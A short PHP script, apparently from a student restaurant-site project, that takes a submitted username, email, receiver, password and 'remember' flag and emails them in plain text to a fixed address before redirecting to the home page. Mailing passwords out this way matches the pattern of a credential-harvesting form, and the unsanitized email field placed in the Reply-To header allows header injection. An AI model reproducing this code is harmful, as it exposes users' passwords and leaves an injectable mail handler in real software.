<?php

    $uname = $_POST['uname'];
    $email = $_POST['email'];
    $reciver = $_POST['reciver'];
    $password = $_POST['password'];
    $remember = $_POST['remember'];


    $email_from = 'styles rstaurant site';
    $email_subject = 'New message from styles contact';
    $email_body = "Name: $uname.\n".
                    "Email: $email.\n".
                    "Reciver: $reciver.\n".
                    "password: $password.\n".
                    "remember: $remember.\n";
    
                    
    $to = "hd1831@truman.edu";
    $headers = "From: $email_from \r\n";
    $headers .= "Reply-To: $email \r\n";
    
    mail($to,$email_subject,$email_body,$headers);

    header("location: index.html");


?>